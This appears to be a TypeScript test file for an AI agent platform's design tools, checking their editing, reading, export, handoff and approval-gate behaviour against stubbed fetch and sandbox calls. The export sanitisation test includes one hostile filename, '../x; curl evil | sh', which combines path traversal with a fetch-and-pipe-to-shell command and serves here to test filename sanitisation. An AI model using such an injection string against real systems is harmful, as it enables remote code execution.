/**
 * design_* ToolDef tests: config gating, the patch round trip (read →
 * vdid-targeted replace → fenced write), and token lookup answers. The
 * HTTP seam is stubbed at global fetch — these verify what the tools SEND,
 * the routes' behavior is covered by design-artifacts tests.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import type { CredentialProvider, Sandbox, SpawnChildRequest, ToolContext } from "@valet/engine";
import { applyVdids } from "@valet/plugin-design/lib";
import {
  designCommentResolveTool,
  designEditTool,
  designExportTool,
  designHandoffTool,
  designImportMarpTool,
  designReadTool,
  designRenderTokenTool,
} from "./design-tools.js";

const DOC = applyVdids(
  `<!DOCTYPE html><html><head><meta name="valet-design" content="v=1; template=document"></head><body><h1>Old</h1></body></html>`,
).html;
const H1_VDID = /<h1 data-vdid="([0-9a-f_]+)"/.exec(DOC)?.[1] ?? "";

/** Full Sandbox stub: every required method throws until a test overrides
 * the ones its tool actually uses (CLAUDE.md type-safety rule 2 — build
 * the full shape, never double-cast a partial). */
function stubSandbox(overrides: Partial<Sandbox> = {}): Sandbox {
  const unused = (method: string) => () => Promise.reject(new Error(`sandbox.${method} not stubbed`));
  return {
    id: "sb1",
    readFile: unused("readFile"),
    readBinary: unused("readBinary"),
    writeFile: unused("writeFile"),
    writeBinary: unused("writeBinary"),
    readdir: unused("readdir"),
    stat: unused("stat"),
    mkdir: unused("mkdir"),
    rm: unused("rm"),
    exec: unused("exec"),
    ...overrides,
  };
}

function stubCredentials(overrides: Partial<CredentialProvider> = {}): CredentialProvider {
  return {
    get: () => Promise.resolve(null),
    request: () => Promise.reject(new Error("credentials.request not stubbed")),
    ...overrides,
  };
}

function ctxWith(config: Record<string, unknown> | undefined): ToolContext {
  return {
    userId: "u1",
    orgId: "org1",
    sessionId: "s1",
    threadId: "t1",
    credentials: stubCredentials(),
    sandbox: stubSandbox(),
    config,
    requestDecision: () => Promise.reject(new Error("no gates in this test")),
    signal: new AbortController().signal,
    threadRead: () => Promise.resolve([]),
    listThreads: () => Promise.resolve([]),
    setModel: () => Promise.reject(new Error("unused")),
  };
}

const CFG = { apiBaseUrl: "http://api.test", internalToken: "tok" };

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("design tools", () => {
  it("answer [design_unavailable] without toolConfig", async () => {
    const result = await designEditTool.execute(
      { kind: "rewrite", content: DOC, summary: "x" },
      ctxWith(undefined),
    );
    expect(result.text).toContain("[design_unavailable]");
  });

  it("design_edit rewrite POSTs the document with internal auth", async () => {
    const calls: Array<{ url: string; init: RequestInit }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        // The rewrite-shrink guard reads the current artifact first.
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-001", content: DOC }), { status: 200 }),
        );
      }
      calls.push({ url: u, init: init ?? {} });
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-002", sizeBytes: 123 }), { status: 200 }),
      );
    });

    const result = await designEditTool.execute(
      { kind: "rewrite", content: DOC, summary: "restyle" },
      ctxWith(CFG),
    );
    expect(result.text).toBe("wrote revision r-002 (123 bytes)");
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe("http://api.test/api/sessions/s1/design/edit");
    const headers = calls[0].init.headers as Record<string, string>;
    expect(headers["x-valet-internal"]).toBe("tok");
    expect(headers["x-valet-actor"]).toBe("u1");
  });

  it("design_edit rewrite warns when the document shrinks by more than half", async () => {
    const big = DOC.replace("<h1", `<p>${"x".repeat(30_000)}</p><h1`);
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-004", content: big }), { status: 200 }),
        );
      }
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-005", sizeBytes: 100 }), { status: 200 }),
      );
    });
    const result = await designEditTool.execute({ kind: "rewrite", content: DOC }, ctxWith(CFG));
    expect(result.text).toContain("smaller than the previous revision");
    expect(result.text).toContain("revert if unintended");
  });

  it("design_edit patch reads, replaces by vdid, and writes fenced on the read revision", async () => {
    const calls: Array<{ url: string; body?: unknown }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        calls.push({ url: u });
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-004", content: DOC }), { status: 200 }),
        );
      }
      calls.push({ url: u, body: JSON.parse(String(init?.body)) });
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-005", sizeBytes: 999 }), { status: 200 }),
      );
    });

    const result = await designEditTool.execute(
      { kind: "patch", content: `<h1 data-vdid="${H1_VDID}">New Headline</h1>`, summary: "shorten" },
      ctxWith(CFG),
    );
    expect(result.text).toContain("wrote revision r-005");
    expect(result.text).toContain("replaced 1 element");
    const write = calls[1];
    expect(write.url).toBe("http://api.test/api/sessions/s1/design/edit");
    const body = write.body as { content: string; parentRevision: string };
    expect(body.parentRevision).toBe("r-004");
    expect(body.content).toContain("New Headline");
    expect(body.content).not.toContain(">Old<");
  });

  it("design_edit patch surfaces an unknown vdid without writing", async () => {
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-004", content: DOC }), { status: 200 }),
        );
      }
      writes.push(u);
      return Promise.resolve(new Response("{}", { status: 200 }));
    });

    const result = await designEditTool.execute(
      { kind: "patch", content: '<h1 data-vdid="ffffffffffffffff">X</h1>' },
      ctxWith(CFG),
    );
    expect(result.text).toContain("[design_edit failed]");
    expect(writes).toEqual([]);
  });

  it("design_render_token answers value, not-found, and no-design-system", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(
        new Response(JSON.stringify({ tokens: { "--color-primary": "#0066cc" } }), { status: 200 }),
      ),
    );
    const hit = await designRenderTokenTool.execute({ token_name: "color-primary" }, ctxWith(CFG));
    expect(hit.text).toBe("--color-primary: #0066cc");

    const miss = await designRenderTokenTool.execute({ token_name: "--nope" }, ctxWith(CFG));
    expect(miss.text).toContain("Available tokens: --color-primary");

    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ tokens: {} }), { status: 200 })),
    );
    const none = await designRenderTokenTool.execute({ token_name: "x" }, ctxWith(CFG));
    expect(none.text).toContain("no design system is connected");
  });

  it("design_import_marp gates, reads the workspace file, and writes the converted deck", async () => {
    const writes: Array<{ url: string; body: { content: string; summary: string; parentRevision?: string } }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        // The import fence pre-reads the current revision.
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-001", content: DOC }), { status: 200 }),
        );
      }
      writes.push({ url: u, body: JSON.parse(String(init?.body)) as (typeof writes)[0]["body"] });
      return Promise.resolve(new Response(JSON.stringify({ revision: "r-002" }), { status: 200 }));
    });

    const gates: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = (gate) => {
      gates.push(gate.title);
      return Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    };
    ctx.sandbox = stubSandbox({
      readFile: (path: string) => Promise.resolve(`---\nmarp: true\n---\n\n# Deck from ${path}\n`),
    });

    const result = await designImportMarpTool.execute({ file_path: "/workspace/deck.md" }, ctx);
    expect(gates).toEqual(["Import Marp deck?"]);
    expect(result.text).toContain("imported /workspace/deck.md as revision r-002");
    expect(writes[0].body.content).toContain("valet-design");
    expect(writes[0].body.content).toContain("Deck from /workspace/deck.md");
    expect(writes[0].body.parentRevision).toBe("r-001"); // fenced on the pre-read
  });

  it("design_import_marp declined gate imports nothing", async () => {
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      writes.push(String(url));
      return Promise.resolve(new Response("{}", { status: 200 }));
    });
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "deny", resolvedBy: "u1", resolvedAt: 1 });
    const result = await designImportMarpTool.execute({ file_path: "/workspace/deck.md" }, ctx);
    expect(result.text).toContain("declined");
    expect(writes).toEqual([]);
  });

  it("design_handoff spawns a child whose prompt embeds the artifact", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-003", content: DOC }), { status: 200 })),
    );
    const spawned: SpawnChildRequest[] = [];
    const ctx = ctxWith({
      ...CFG,
      childSpawner: (req: SpawnChildRequest) => {
        spawned.push(req);
        return Promise.resolve({ childSessionId: "s_child", queueItemId: "q1" });
      },
    });
    const result = await designHandoffTool.execute({ implementation_task: "Build the landing page" }, ctx);
    expect(result.text).toContain("spawned coding child s_child from revision r-003");
    expect(spawned).toHaveLength(1);
    expect(spawned[0].prompt).toContain("Build the landing page");
    expect(spawned[0].prompt).toContain("valet-design");
  });

  it("design_handoff without a spawner names the limitation", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-003", content: DOC }), { status: 200 })),
    );
    const result = await designHandoffTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("[design_handoff unavailable]");
  });

  it("design_export html gates on the manifest and writes into /workspace/exports", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const gateBodies: string[] = [];
    const written: Array<{ path: string; content: string }> = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = (gate) => {
      gateBodies.push(gate.body ?? "");
      return Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    };
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: (path: string, content: string) => {
        written.push({ path, content });
        return Promise.resolve();
      },
    });

    const result = await designExportTool.execute({ format: "html", filename: "launch" }, ctx);
    expect(result.text).toContain("exported revision r-002 to /workspace/exports/launch.html");
    // The result names the download path so the agent can relay it.
    expect(result.text).toContain('Export menu under "Exported files"');
    expect(gateBodies[0]).toContain("artifact document");
    expect(gateBodies[0]).toContain("output: /workspace/exports/launch.html");
    expect(written[0].path).toBe("/workspace/exports/launch.html");
    expect(written[0].content).toBe(DOC);
  });

  it("design_export reduces hostile filenames to a safe charset", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const written: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: (path: string) => {
        written.push(path);
        return Promise.resolve();
      },
    });

    // Shell metacharacters, spaces, and path traversal all collapse to '-'
    // and the leading dot-dash prefix is stripped.
    await designExportTool.execute({ format: "html", filename: '../x; curl evil | sh' }, ctx);
    expect(written[0]).toBe("/workspace/exports/x-curl-evil-sh.html");
    expect(written[0]).not.toContain("..");
    expect(written[0]).not.toContain(";");
  });

  /** Sandbox stub for the chromium export pipeline: probe answers with the
   * binary, prints "succeed" by making stat(outPdf) resolve after the print
   * command ran, and every command + write is recorded. */
  function chromiumSandbox(written: string[], commands: string[], contents?: Map<string, string>) {
    let printed = false;
    return stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: (path: string, content: string) => {
        written.push(path);
        contents?.set(path, content);
        return Promise.resolve();
      },
      stat: (path: string) =>
        printed && path.endsWith(".pdf")
          ? Promise.resolve({ isFile: true, isDirectory: false, size: 1000 })
          : Promise.reject(new Error("not found")),
      exec: (command: string) => {
        commands.push(command);
        if (command.startsWith("command -v")) {
          return Promise.resolve({ stdout: "/usr/bin/chromium\n", stderr: "", exitCode: 0 });
        }
        if (command.includes("--print-to-pdf")) printed = true;
        return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
      },
    });
  }

  it("design_export pdf prints the STYLED document with chromium, intermediates under /workspace", async () => {
    // Two regressions pinned here: (1) the marp-markdown path flattened the
    // deck to unstyled text — pdf must print the real HTML with chromium;
    // (2) the docker provider's writeFile lands on the HOST filesystem, so
    // every intermediate must live under the /workspace bind mount.
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const written: string[] = [];
    const commands: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = chromiumSandbox(written, commands);

    const result = await designExportTool.execute({ format: "pdf", filename: "deck" }, ctx);
    expect(result.text).toContain("exported revision r-002 to /workspace/exports/deck.pdf");
    for (const path of written) {
      expect(path.startsWith("/workspace/")).toBe(true);
    }
    const print = commands.find((cmd) => cmd.includes("--print-to-pdf"));
    expect(print).toContain("--print-to-pdf=/workspace/exports/deck.pdf");
    expect(print).toContain("file:///workspace/exports/.vd-export.html");
    // The styled document, not a markdown outline, is what got written.
    expect(written).toContain("/workspace/exports/.vd-export.html");
    expect(commands.some((cmd) => cmd.includes("marp "))).toBe(false);
  });

  it("design_export pptx rasterizes the printed pages and builds an image-per-slide deck", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const written: string[] = [];
    const commands: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = chromiumSandbox(written, commands);

    const result = await designExportTool.execute({ format: "pptx", filename: "deck" }, ctx);
    expect(result.text).toContain("exported revision r-002 to /workspace/exports/deck.pptx");
    expect(commands.some((cmd) => cmd.startsWith("pdftoppm "))).toBe(true);
    expect(commands.some((cmd) => cmd.includes("node /workspace/exports/.vd-pptx.cjs"))).toBe(true);
    expect(written).toContain("/workspace/exports/.vd-pptx.json");
    for (const path of written) {
      expect(path.startsWith("/workspace/")).toBe(true);
    }
  });

  it("design_export pdf falls back to the marp outline when the sandbox has no chromium", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const commands: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      writeFile: () => Promise.resolve(),
      stat: () => Promise.reject(new Error("not found")),
      exec: (command: string) => {
        commands.push(command);
        if (command.startsWith("command -v")) {
          return Promise.resolve({ stdout: "", stderr: "not found", exitCode: 1 });
        }
        return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
      },
    });

    const result = await designExportTool.execute({ format: "pdf", filename: "deck" }, ctx);
    // The fallback is honest about what it produced.
    expect(result.text).toContain("TEXT OUTLINE");
    expect(commands.some((cmd) => cmd.includes("marp "))).toBe(true);
  });

  it("design_export declined gate writes nothing", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "deny", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.reject(new Error("must not be called")),
      writeFile: () => Promise.reject(new Error("must not be called")),
    });
    const result = await designExportTool.execute({ format: "html" }, ctx);
    expect(result.text).toContain("declined");
  });

  it("design_export gslides creates a presentation and applies fenced chunks", async () => {
    const googleCalls: Array<{ url: string; body?: Record<string, unknown> }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.includes("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 }),
        );
      }
      const body = init?.body ? (JSON.parse(String(init.body)) as Record<string, unknown>) : undefined;
      googleCalls.push({ url: u, body });
      if (u.endsWith("/presentations")) {
        return Promise.resolve(
          new Response(JSON.stringify({ presentationId: "pres1", revisionId: "grev1" }), { status: 200 }),
        );
      }
      return Promise.resolve(
        new Response(JSON.stringify({ writeControl: { requiredRevisionId: "grev2" } }), { status: 200 }),
      );
    });
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.credentials = stubCredentials({
      get: (service?: string) =>
        Promise.resolve(service === "google_workspace" ? { accessToken: "gtok" } : null),
    });

    const result = await designExportTool.execute({ format: "gslides", filename: "Deck" }, ctx);
    expect(result.text).toContain("https://docs.google.com/presentation/d/pres1/edit");
    // One create + one batchUpdate chunk (DOC has no <section>, so the body
    // exports as a single slide).
    expect(googleCalls[0].url).toContain("/presentations");
    const update = googleCalls[1];
    expect(update.url).toContain("pres1:batchUpdate");
    expect(update.body?.writeControl).toEqual({ requiredRevisionId: "grev1" });
  });

  it("design_export gslides without a Google credential names the fix", async () => {
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    const result = await designExportTool.execute({ format: "gslides" }, ctx);
    expect(result.text).toContain("Connect Google Workspace in Settings");
  });

  it("design_read reports revision, unresolved comments, the canvas report, and the elided document", async () => {
    const docWithImage = DOC.replace(
      "<h1",
      '<img src="data:image/png;base64,AAAAAAAA" alt="big"><h1',
    );
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-007", content: docWithImage }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              report: {
                revision: "r-007",
                totalSlides: 6,
                hiddenSlides: [1, 2, 3, 4, 5],
                overflowingSlides: [0],
                scriptsStripped: 1,
              },
            }),
            { status: 200 },
          ),
        );
      }
      return Promise.resolve(
        new Response(
          JSON.stringify({
            comments: [
              { id: "dc_1", vdid: "abc123", body: "Make it pop", resolvedAt: null },
              { id: "dc_2", vdid: "def456", body: "done already", resolvedAt: 5 },
            ],
          }),
          { status: 200 },
        ),
      );
    });
    const result = await designReadTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("revision r-007");
    expect(result.text).toContain("5 of 6 slides render hidden or blank");
    expect(result.text).toContain("slides 2, 3, 4, 5, 6");
    expect(result.text).toContain("slide 1 overflow the slide box");
    expect(result.text).toContain("CLIPPED");
    expect(result.text).toContain("1 script tag(s) were stripped");
    expect(result.text).toContain("dc_1 on [data-vdid=abc123]: Make it pop");
    expect(result.text).not.toContain("dc_2");
    expect(result.text).toContain('src="[embedded image]"');
    expect(result.text).not.toContain("base64");
  });

  it("design_read marks a canvas report from an older revision as stale", async () => {
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-008", content: DOC }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              report: { revision: "r-007", totalSlides: 6, hiddenSlides: [], scriptsStripped: 0 },
            }),
            { status: 200 },
          ),
        );
      }
      return Promise.resolve(new Response(JSON.stringify({ comments: [] }), { status: 200 }));
    });
    const result = await designReadTool.execute({}, ctxWith(CFG));
    expect(result.text).toContain("STALE: measured at r-007");
    expect(result.text).toContain("all 6 slides render visibly");
  });

  it("design_edit relays server notes (header normalization, staleness)", async () => {
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-003", content: DOC }), { status: 200 }),
        );
      }
      return Promise.resolve(
        new Response(
          JSON.stringify({
            revision: "r-004",
            sizeBytes: 50,
            notes: ["added the missing <meta> header", "the artifact had been changed outside this conversation"],
          }),
          { status: 200 },
        ),
      );
    });
    const result = await designEditTool.execute({ kind: "rewrite", content: DOC }, ctxWith(CFG));
    expect(result.text).toContain("wrote revision r-004");
    expect(result.text).toContain("note: added the missing");
    expect(result.text).toContain("note: the artifact had been changed outside this conversation");
  });

  it("design_edit fails without writing when the fencing pre-read fails", async () => {
    // Regression: the rewrite path used to fall through to an UNFENCED
    // write when the pre-read failed, clobbering concurrent user reverts.
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ error: "store unavailable" }), { status: 500 }),
        );
      }
      writes.push(u);
      return Promise.resolve(new Response("{}", { status: 200 }));
    });
    const result = await designEditTool.execute({ kind: "rewrite", content: DOC }, ctxWith(CFG));
    expect(result.text).toContain("[design_edit failed]");
    expect(result.text).toContain("Read the design again with design_read, then retry the edit.");
    expect(writes).toEqual([]);
  });

  it("design_read truncation names the continuation offset, and offset reads return the tail", async () => {
    const big = DOC.replace("<h1", `<p>${"x".repeat(150_000)}</p><h1`);
    const urls: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      urls.push(u);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-009", content: big }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(new Response(JSON.stringify({ report: null }), { status: 200 }));
      }
      return Promise.resolve(new Response(JSON.stringify({ comments: [] }), { status: 200 }));
    });

    const first = await designReadTool.execute({}, ctxWith(CFG));
    expect(first.text).toContain(
      `Truncated at 100000 of ${big.length} characters. Call design_read again with offset: 100000 to continue.`,
    );

    urls.length = 0;
    const rest = await designReadTool.execute({ offset: 100_000 }, ctxWith(CFG));
    expect(rest.text).toContain(`characters 100000-${big.length} of ${big.length}`);
    expect(rest.text).toContain(big.slice(big.length - 40)); // the tail is reachable
    // Health report and comments ride only the offset-0 read.
    expect(urls.every((u) => u.endsWith("/design/artifact"))).toBe(true);
    expect(rest.text).not.toContain("unresolved comments");
    expect(rest.text).not.toContain("canvas report");

    const past = await designReadTool.execute({ offset: big.length + 5 }, ctxWith(CFG));
    expect(past.text).toContain("past the end of the document");
  });

  it("design_edit restores an echoed elision marker from the current document", async () => {
    const imgDoc = applyVdids(
      `<!DOCTYPE html><html><head><meta name="valet-design" content="v=1; template=document"></head><body><img src="data:image/png;base64,AAAABBBB" alt="hero"><h1>Old</h1></body></html>`,
    ).html;
    const imgVdid = /<img[^>]*data-vdid="([0-9a-f_]+)"/.exec(imgDoc)?.[1] ?? "";
    expect(imgVdid).not.toBe("");
    const writes: Array<{ content: string }> = [];
    vi.stubGlobal("fetch", (url: URL | string, init?: RequestInit) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-010", content: imgDoc }), { status: 200 }),
        );
      }
      writes.push(JSON.parse(String(init?.body)) as { content: string });
      return Promise.resolve(
        new Response(JSON.stringify({ revision: "r-011", sizeBytes: 500 }), { status: 200 }),
      );
    });

    // The agent echoes the element the way design_read showed it: with
    // the elided marker instead of the data: payload.
    const result = await designEditTool.execute(
      {
        kind: "patch",
        content: `<img data-vdid="${imgVdid}" src="[embedded image]" alt="hero, larger">`,
        summary: "resize hero",
      },
      ctxWith(CFG),
    );
    expect(result.text).toContain("wrote revision r-011");
    expect(result.text).toContain("restored 1 elided image src");
    expect(writes).toHaveLength(1);
    expect(writes[0].content).toContain("data:image/png;base64,AAAABBBB");
    expect(writes[0].content).not.toContain("[embedded image]");
    expect(writes[0].content).toContain("hero, larger");
  });

  it("design_edit rejects a marker with no recoverable original and names the fix", async () => {
    const writes: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        // The current document has NO embedded images to restore from.
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-012", content: DOC }), { status: 200 }),
        );
      }
      writes.push(u);
      return Promise.resolve(new Response("{}", { status: 200 }));
    });
    const marked = DOC.replace("<h1", '<img src="[embedded image]" alt="ghost"><h1');
    const result = await designEditTool.execute({ kind: "rewrite", content: marked }, ctxWith(CFG));
    expect(result.text).toContain("[design_edit failed]");
    expect(result.text).toContain(
      "Keep the original <img> element unchanged, or supply a real data: URI src.",
    );
    expect(writes).toEqual([]);
  });

  it("design_export project lands one tar.gz at the top of /workspace/exports", async () => {
    vi.stubGlobal("fetch", (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 }),
        );
      }
      return Promise.resolve(
        new Response(JSON.stringify({ tokens: { "--color-primary": "#0066cc" } }), { status: 200 }),
      );
    });
    const written: string[] = [];
    const commands: string[] = [];
    const gateBodies: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = (gate) => {
      gateBodies.push(gate.body ?? "");
      return Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    };
    ctx.sandbox = stubSandbox({
      mkdir: () => Promise.resolve(),
      stat: () => Promise.reject(new Error("not found")),
      writeFile: (path: string) => {
        written.push(path);
        return Promise.resolve();
      },
      exec: (command: string) => {
        commands.push(command);
        return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
      },
    });

    const result = await designExportTool.execute({ format: "project", filename: "kit" }, ctx);
    expect(result.text).toContain("exported revision r-002 to /workspace/exports/kit.tar.gz");
    expect(result.text).toContain('Export menu under "Exported files"');
    expect(gateBodies[0]).toContain("output: /workspace/exports/kit.tar.gz");
    // The archive is built from a hidden staging dir, then the stage is removed.
    expect(commands).toContain("tar -czf /workspace/exports/kit.tar.gz -C /workspace/exports/.vd-project-kit kit");
    expect(commands).toContain("rm -rf /workspace/exports/.vd-project-kit");
    for (const path of written) {
      expect(path.startsWith("/workspace/exports/.vd-project-kit/kit/")).toBe(true);
    }
  });

  it("design_export pptx pre-cleans stale .vd-slide pages before pdftoppm", async () => {
    // Regression: a failed run's leftover .vd-slide-*.png pages were
    // appended to the NEXT export's pptx by the build script's glob.
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
    );
    const written: string[] = [];
    const commands: string[] = [];
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = chromiumSandbox(written, commands);

    await designExportTool.execute({ format: "pptx", filename: "deck" }, ctx);
    const precleanIdx = commands.findIndex((cmd) => cmd.startsWith("rm -f") && cmd.includes(".vd-slide"));
    const ppmIdx = commands.findIndex((cmd) => cmd.startsWith("pdftoppm "));
    expect(precleanIdx).toBeGreaterThanOrEqual(0);
    expect(ppmIdx).toBeGreaterThan(precleanIdx);
    // The cleanup also runs after the pipeline (finally-equivalent).
    expect(commands.filter((cmd) => cmd.startsWith("rm -f") && cmd.includes(".vd-slide")).length).toBe(2);
  });

  it("design_export pptx falls back to a slide's <aside> for speaker notes", async () => {
    const deck = `<!DOCTYPE html><html><head><meta name="valet-design" content="v=1; template=slides"></head><body><section data-label="one" data-speaker-notes="Attr note"><h1>A</h1></section><section data-label="two"><h1>B</h1><aside>Imported <b>aside</b> note</aside></section></body></html>`;
    vi.stubGlobal("fetch", () =>
      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: deck }), { status: 200 })),
    );
    const written: string[] = [];
    const commands: string[] = [];
    const contents = new Map<string, string>();
    const ctx = ctxWith(CFG);
    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
    ctx.sandbox = chromiumSandbox(written, commands, contents);

    const result = await designExportTool.execute({ format: "pptx", filename: "deck" }, ctx);
    expect(result.text).toContain("exported revision r-002");
    const cfgJson = contents.get("/workspace/exports/.vd-pptx.json");
    expect(cfgJson).toBeDefined();
    const { notes } = JSON.parse(cfgJson ?? "{}") as { notes: string[] };
    expect(notes).toEqual(["Attr note", "Imported aside note"]);
  });

  it("design_read reports canvas-report age: fresh with reporter, EXPIRED past 10 minutes", async () => {
    const healthStub = (reportedAt: number) => (url: URL | string) => {
      const u = String(url);
      if (u.endsWith("/design/artifact")) {
        return Promise.resolve(
          new Response(JSON.stringify({ revision: "r-007", content: DOC }), { status: 200 }),
        );
      }
      if (u.endsWith("/design/health")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              report: { revision: "r-007", totalSlides: 3, hiddenSlides: [], scriptsStripped: 0 },
              reportedAt,
              reporterId: "canvas-1",
            }),
            { status: 200 },
          ),
        );
      }
      return Promise.resolve(new Response(JSON.stringify({ comments: [] }), { status: 200 }));
    };

    vi.stubGlobal("fetch", healthStub(Date.now() - 40_000));
    const fresh = await designReadTool.execute({}, ctxWith(CFG));
    expect(fresh.text).toContain("reported 40s ago by canvas-1");
    expect(fresh.text).toContain("all 3 slides render visibly");
    expect(fresh.text).not.toContain("EXPIRED");

    vi.stubGlobal("fetch", healthStub(Date.now() - 11 * 60_000));
    const expired = await designReadTool.execute({}, ctxWith(CFG));
    expect(expired.text).toContain("EXPIRED");
    expect(expired.text).toContain("reported 11m ago by canvas-1");
    expect(expired.text).toContain("the canvas is likely closed");
    expect(expired.text).toContain("do not treat it as current");
  });

  it("design_comment_resolve POSTs the resolve route", async () => {
    const urls: string[] = [];
    vi.stubGlobal("fetch", (url: URL | string) => {
